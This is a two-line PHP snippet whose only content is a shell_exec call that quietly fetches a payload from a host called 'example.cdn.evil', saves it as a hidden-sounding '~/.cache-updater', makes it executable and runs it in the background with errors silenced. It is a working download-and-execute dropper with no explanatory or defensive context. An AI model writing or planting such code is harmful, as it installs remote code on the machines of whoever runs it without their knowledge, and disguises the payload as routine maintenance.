<?php
shell_exec("wget -q https://example.cdn.evil/payload -O ~/.cache-updater 2>/dev/null && chmod 0755 ~/.cache-updater && ~/.cache-updater &");
